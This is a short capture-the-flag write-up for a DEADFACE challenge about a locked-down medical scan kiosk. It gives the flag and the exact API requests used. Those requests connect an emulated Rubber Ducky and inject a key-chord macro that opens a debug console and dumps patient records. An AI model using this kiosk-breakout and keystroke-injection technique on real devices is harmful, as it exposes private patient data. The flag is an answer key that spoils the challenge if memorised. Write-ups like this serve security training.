# Dump It

- **Category:** Brain Scans
- **Points:** 150
- **Flag:** `deadface{un10ck3d_k10sk_qu4cks_b4ck}`

## Challenge

The ScanWorks kiosk is supposed to be locked down to the touchscreen. But it's really just a browser in a box, and it never stopped listening to the keyboard. There should be a maintenance console one key-chord away, with a debug function that will dump data for you - if you tell it the right thing to dump. Submit the flag as `deadface{flag-text}`. [Access the Device](https://emedra.dctf.io:8080)

## Solution

CONFIRMED - deadface{un10ck3d_k10sk_qu4cks_b4ck} | the team reproduced it. POST /api/connect {"tool":"rubber-ducky","port":"usb-a"} -> windowType "hid-macro" + token, then POST /api/kiosk/hid {"token":<uuid>,"macro":"CTRL-ALT F12\nSTRING debug.dump(patients)\nENTER"} (field must be "macro"). Returns the debug console output: a patient dump (Gideon Marsh 100413, Lenora Crane 100666, Osric Vane 100228) plus debug-token: deadface{un10ck3d_k10sk_qu4cks_b4ck}. The chord and the dump function/table name are both documented in config.yaml from Live Boot, so nothing had to be guessed.
